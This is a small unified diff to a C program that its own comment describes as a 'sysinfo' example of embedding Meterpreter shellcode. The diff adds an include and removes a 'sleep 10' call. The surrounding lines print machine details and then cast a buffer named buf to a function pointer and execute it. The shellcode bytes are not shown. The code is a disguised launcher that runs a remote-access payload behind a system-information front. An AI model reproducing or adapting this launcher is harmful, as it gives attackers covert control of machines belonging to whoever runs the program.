@@ -1,4 +1,5 @@
 /* simple program (sysinfo) which is simple example of using meterpreter shellcode in code */
+#include<string.h>
 #include<stdio.h> 
 #include<stdlib.h> 
 #include<errno.h> 
@@ -25,6 +26,5 @@ int main()
    printf("Machine = %s\n", buf1.machine); 
    printf("\n");
    void (*ret)() = (void(*)())buf;
-   system("sleep 10;");
    ret();
 } 
